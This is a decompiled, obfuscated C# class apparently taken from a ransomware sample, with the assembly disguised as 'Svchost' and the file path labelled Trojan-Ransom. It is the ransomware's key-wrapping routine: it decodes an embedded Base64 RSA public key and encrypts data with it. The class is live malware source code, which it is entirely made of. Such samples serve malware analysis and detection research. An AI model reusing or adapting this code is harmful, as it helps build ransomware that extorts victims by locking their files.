// Decompiled with JetBrains decompiler
// Type: sWduCclqEzKrM.PmmjrDLLHGk
// Assembly: Svchost, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B0EDCE10-9F20-42C9-8790-E70D370F9841
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.Win32.Generic-9bf0633f41d2962ba5e2895ece2ef9fa7b546ada311ca30f330f0d261a7fb184.exe

using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace sWduCclqEzKrM
{
  public static class PmmjrDLLHGk
  {
    private static bool KLYtNlyEWvd;
    private static readonly string VZFMqwnhbLIxe;
    [NonSerialized]
    internal static GetString \u0001;

    public static string kPAAXvpwzUaT([In] string obj0)
    {
      int xtLUEoVLTDOI = 0;
      string AlliZrTFaaO = PmmjrDLLHGk.\u0001(107400745);
      PmmjrDLLHGk.chwqsPFQodYB(PmmjrDLLHGk.VZFMqwnhbLIxe, out xtLUEoVLTDOI, out AlliZrTFaaO);
      return Convert.ToBase64String(PmmjrDLLHGk.BnGiQrAdRQ(Encoding.UTF8.GetBytes(obj0), xtLUEoVLTDOI, AlliZrTFaaO));
    }

    private static byte[] BnGiQrAdRQ([In] byte[] obj0, [In] int obj1, [In] string obj2)
    {
      if (obj0 == null || obj0.Length == 0)
        throw new ArgumentException(PmmjrDLLHGk.\u0001(107379088), PmmjrDLLHGk.\u0001(107379035));
      int num = PmmjrDLLHGk.hbJdjLPTzAoe(obj1);
      if (obj0.Length > num)
        throw new ArgumentException(string.Format(PmmjrDLLHGk.\u0001(107379026), (object) num), PmmjrDLLHGk.\u0001(107379035));
      if (!PmmjrDLLHGk.cotQoyCawQgfWo(obj1))
        throw new ArgumentException(PmmjrDLLHGk.\u0001(107379021), PmmjrDLLHGk.\u0001(107378992));
      if (string.IsNullOrEmpty(obj2))
        throw new ArgumentException(PmmjrDLLHGk.\u0001(107378979), PmmjrDLLHGk.\u0001(107378950));
      using (RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider(obj1))
      {
        cryptoServiceProvider.FromXmlString(obj2);
        return cryptoServiceProvider.Encrypt(obj0, PmmjrDLLHGk.KLYtNlyEWvd);
      }
    }

    private static int hbJdjLPTzAoe([In] int obj0) => PmmjrDLLHGk.KLYtNlyEWvd ? (obj0 - 384) / 8 + 7 : (obj0 - 384) / 8 + 37;

    private static bool cotQoyCawQgfWo([In] int obj0) => obj0 >= 384 && obj0 <= 16384 && obj0 % 8 == 0;

    private static void chwqsPFQodYB(
      string TjvhwFxboWMGquui,
      out int xtLUEoVLTDOI,
      out string AlliZrTFaaO)
    {
      xtLUEoVLTDOI = 0;
      AlliZrTFaaO = PmmjrDLLHGk.\u0001(107400745);
      if (TjvhwFxboWMGquui == null || TjvhwFxboWMGquui.Length <= 0)
        return;
      string str = Encoding.UTF8.GetString(Convert.FromBase64String(TjvhwFxboWMGquui));
      if (!str.Contains(PmmjrDLLHGk.\u0001(107378901)))
        return;
      string[] strArray = str.Split(new char[1]{ '!' }, 2);
      try
      {
        xtLUEoVLTDOI = int.Parse(strArray[0]);
        AlliZrTFaaO = strArray[1];
      }
      catch (Exception ex)
      {
      }
    }

    static PmmjrDLLHGk()
    {
      Strings.CreateGetStringDelegate(typeof (PmmjrDLLHGk));
      PmmjrDLLHGk.KLYtNlyEWvd = false;
      PmmjrDLLHGk.VZFMqwnhbLIxe = PmmjrDLLHGk.\u0001(107378928);
    }
  }
}
